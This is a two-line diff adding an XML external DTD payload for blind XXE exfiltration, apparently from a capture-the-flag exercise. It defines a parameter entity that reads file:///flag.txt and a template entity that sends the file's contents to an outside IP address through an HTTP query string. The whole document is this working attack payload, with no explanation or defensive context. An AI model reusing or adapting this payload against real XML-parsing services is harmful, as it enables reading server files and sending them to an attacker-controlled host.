@@ -1,0 +1,2 @@
+<!ENTITY % secret1 SYSTEM "file:///flag.txt">
+<!ENTITY % template "<!ENTITY res SYSTEM 'http://51.158.113.8/?data=%secret1;'>">
